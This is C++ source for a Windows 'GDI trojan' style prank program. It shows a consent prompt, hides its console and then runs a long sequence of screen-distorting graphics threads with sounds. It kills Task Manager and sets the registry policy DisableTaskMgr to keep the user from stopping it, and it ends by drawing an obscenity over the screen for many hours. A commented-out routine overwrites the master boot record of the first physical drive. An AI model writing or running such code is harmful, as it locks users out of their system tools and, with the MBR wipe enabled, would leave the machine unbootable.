#include <windows.h>
#include <iostream>
#include "sound.cpp"



VOID NotShowWindow()
{
	FreeConsole();
	HWND hnd ;
	AllocConsole();
	hnd = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(hnd,0);
}

DWORD WINAPI cooleffect1(LPVOID LPARAM)
{
	FreeConsole();
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	int i;
	for (;;i = i*1)
	{
		HBRUSH hb = CreateSolidBrush(RGB(rand()%254,0,0));
		SelectObject(hdc,hb);
		PatBlt(hdc,rand()%x,rand()%x,-25,-25,PATINVERT);
	}
	Sleep(10);
	return 0x0001;
}





DWORD WINAPI cooleffect2(LPVOID LPARAM)
{
	FreeConsole();
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	int i;
	for (;;i = i*1)
	{
		HBRUSH hb = CreateSolidBrush(RGB(rand()%254,0,0));
		SelectObject(hdc,hb);
		PatBlt(hdc,rand()%x,rand()%x,-100,-100,PATINVERT);
	}
	Sleep(10);
	return 0x0001;
}


DWORD WINAPI cooleffect2o(LPVOID LPARAM)
{
	FreeConsole();
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	int i;
	for (;;i = i*1)
	{
		HBRUSH hb = CreateSolidBrush(RGB(rand()%254,0,0));
		SelectObject(hdc,hb);
		BitBlt(hdc,25,-25,x,y,hdc,0,0,SRCCOPY);
		PatBlt(hdc,rand()%x-10,rand()%y-10,rand()%x-10,rand()%y-10,PATCOPY);
	}
	Sleep(10);
	return 0x0001;
}




DWORD WINAPI cooleffect3(LPVOID LPARAM)
{
	FreeConsole();
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	int i;
	for (i = 0 ;;i = i+1)
	{
		StretchBlt(hdc,0,0,x,y,hdc,0,0,x,y,NOTSRCCOPY);
		Sleep(500);
		
		if (i == 5)
		{
			Sleep(1000);
		}
	}
	
	return 0x0001;
}



DWORD WINAPI cooleffect4(LPVOID LPARAM)
{
	FreeConsole();
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	int i;
	for (i = 0 ;;i = i+1)
	{
		StretchBlt(hdc,0,0,x,y,hdc,0,0,x,y,NOTSRCCOPY);
		StretchBlt(hdc,25,25,x-50,y-50,hdc,0,0,x,y,SRCCOPY);
		Sleep(500);
		
	}
	
	return 0x0001;
}

DWORD WINAPI cooleffect5(LPVOID LPARAM)
{
	FreeConsole();
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	int i;
	for (i = 0 ;;i = i+1)
	{
		//StretchBlt(hdc,rand()%x,rand()%y,rand()%x,rand()%y,hdc,0,0,x,y,NOTSRCCOPY);
		StretchBlt(hdc,25,25,x-50,y-50,hdc,0,0,x,y,NOTSRCERASE);
		StretchBlt(hdc,x,0,-x,y,hdc,0,0,x,y,NOTSRCERASE);
		StretchBlt(hdc,0,y,x,-y,hdc,0,0,x,y,NOTSRCERASE);
		
		
	}
	Sleep(10);
	
	return 0x0001;
}



DWORD WINAPI cooleffect8(LPVOID LPARAM)
{
	FreeConsole();
	HDC hdc = GetDC(0);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);
	if (hdc == NULL)
	{
		return 0x01;
	}
	POINT p [3];
	int i,j,k;
		
		
	for (i = 0 ;i<=2;i++)
	{
		p[i].x = rand()%X;
		p[i].y = rand()%Y;
	}
	

	for (i = 0 ;i<1000;i = i+1)
	{
		HBRUSH hb = CreateSolidBrush(RGB (rand()%254,rand()%254,rand()%254));
		SelectObject(hdc,hb);
		Polygon(hdc,p,3);
		
			
			for (j = 0 ;j<=2;j = j+1)
			{
				p[j].x = rand()%X;
				p[j].y = rand()%Y;
			}
			
//			for (k = 0 ;k<=2;k = k+1)
//			{
//				p[k].x = X+(rand()%X);
//				p[k].y = Y+(rand()%Y);
//			}
			Sleep(10);
		
		DeleteObject(hb);
	}
	
	ReleaseDC(0,hdc);
	
	return 0x0001;
}



DWORD WINAPI cooleffect9(LPVOID LPARAM)
{
	FreeConsole();
	HDC hdc;

    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x;
	 while(1) {
        hdc= GetDC(0);
        x = rand() % w;
        BitBlt(hdc, x, 1, 10, h, hdc, x, 0, SRCCOPY);
        Sleep(2);
        ReleaseDC(0, hdc);
    }
	
	return 0x0001;
}


DWORD WINAPI coolEffctx(LPVOID LPARAM)
{
	FreeConsole();

    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        Sleep(50);
        ReleaseDC(0, hdc);
    }
    return 0x0001;
}



DWORD WINAPI shader1(LPVOID LPARAM)
{
	FreeConsole();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 100;
    int y = 80;
	while(1){
		HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
		int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y; 
    	HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    	SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		DrawIcon(hdc,x,y,LoadIcon(NULL,IDI_HAND));
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
                signY = -1;
        }
 
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }
 
        if (y == 0)
        {
            signY = 1;
        }
 
        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
    	DeleteObject(brush);
        ReleaseDC(0, hdc);
	}

return EXIT_SUCCESS;
}

DWORD WINAPI Shader2(LPVOID LPARAM)
{
	HDC hdc = GetDC(0);
int icon_x = GetSystemMetrics(SM_CXICON);
int icon_y = GetSystemMetrics(SM_CYICON);
POINT cursor;

	while(1){
		FreeConsole();
        GetCursorPos(&cursor);
        DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(NULL, IDI_INFORMATION));
	}
	return 0x000;
}



DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		//SetGraphicsMode(hdc,GM_COMPATIBLE);
		SetStretchBltMode(hdc,BLACKONWHITE);
		text = "FUCK";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Die---");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}


/*DWORD Lotta_RMB (LPVOID LPARAM)
{
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	DWORD write;
	HANDLE MBR = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(MBR, mbrData, 512, &write, NULL);
	MessageBox(NULL,TEXT("NO MBr "),TEXT("8(0*)"),MB_OK);
	return 1;
}
*/

DWORD TASKM(LPVOID LPARAM)
{
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	return 0x001;	
}
















int main (int argc ,char **argv)
{


	if (MessageBox(NULL,TEXT("Hi You Wanna Continue!!??"),TEXT("Message From The Creator"),MB_YESNO |MB_ICONINFORMATION)==IDNO)
	ExitProcess(0);


	else{
	NotShowWindow();
	
	HANDLE h1 = CreateThread(0,0,cooleffect1,0,0,0);
	sound0();
	Sleep(30000);
	HANDLE h2 = CreateThread(0,0,cooleffect2,0,0,0);
	sound0();
	Sleep(30000);
	TerminateThread(h1,0x000);
	InvalidateRect(0,0,0);
	CloseHandle(h1);
	TerminateThread(h2,0x000);
	InvalidateRect(0,0,0);
	CloseHandle(h2);
	
	
	
	
	/*HANDLE h1  = CreateThread(0,0,MBR,0,0,0);
	Sleep(100);
	TerminateThread(h1,0);
	InvalidateRect(0,0,TRUE);
	CloseHandle(h1);
	*/
	
	
	
	
	HANDLE hT  = CreateThread(0,0,TASKM,0,0,0);
	Sleep(100);
	TerminateThread(hT,0);
	InvalidateRect(0,0,TRUE);
	CloseHandle(hT);
	
	
	HANDLE h9 = CreateThread(0,0,cooleffect9,0,0,0);
	sound4();
	Sleep(30000);
	TerminateThread(h9,0x001);  //COOL EFFECT 9 
	InvalidateRect(0,0,TRUE);
	CloseHandle(h9);
	
	
	HANDLE Hx0 = CreateThread(0,0,shader1,0,0,0);
	sound1();
	Sleep(30000);
	TerminateThread(Hx0,0);
	InvalidateRect(0,0,TRUE);
	CloseHandle(Hx0);
	
	
	
	
	HANDLE h3 = CreateThread(0,0,cooleffect3,0,0,0);
	Sleep(1000);
	sound2();
	Sleep(10000);
	TerminateThread(h3,0);
	InvalidateRect(0,0,0);
	CloseHandle(h3);
	
	
	HANDLE h4 = CreateThread(0,0,cooleffect4,0,0,0);
	sound2();
	Sleep(20000);
	TerminateThread(h4,0x001);
	InvalidateRect(0,0,0);
	CloseHandle(h4);
	
	
	
	HANDLE h5 = CreateThread(0,0,cooleffect5,0,0,0);
	sound3();
	Sleep(30000);
	TerminateThread(h5,0x001);
	InvalidateRect(0,0,0);
	CloseHandle(h5);
	
	HANDLE h8 = CreateThread(0,0,cooleffect8,0,0,0);
	sound3();
	Sleep(30000);
	TerminateThread(h8,0x001);
	InvalidateRect(0,0,0);
	CloseHandle(h8);
	
	
	HANDLE Hx = CreateThread(0,0,coolEffctx,0,0,0);
	sound3();
	Sleep(30000);
	TerminateThread(Hx,0);
	InvalidateRect(0,0,TRUE);
	CloseHandle(Hx);

	
	
	HANDLE Hx01 = CreateThread(0,0,Shader2,0,0,0);
	Sleep(30000);
	TerminateThread(Hx01,0);
	InvalidateRect(0,0,TRUE);
	CloseHandle(Hx01);
	
	HANDLE Hx02 = CreateThread(0,0,textout1,0,0,0);
	sound3();
	sound3();
	sound3();
	Sleep(100000000);
	TerminateThread(Hx02,0);
	InvalidateRect(0,0,TRUE);
	CloseHandle(Hx02);
	
	
	
}
	
	
	return 0x000;
}
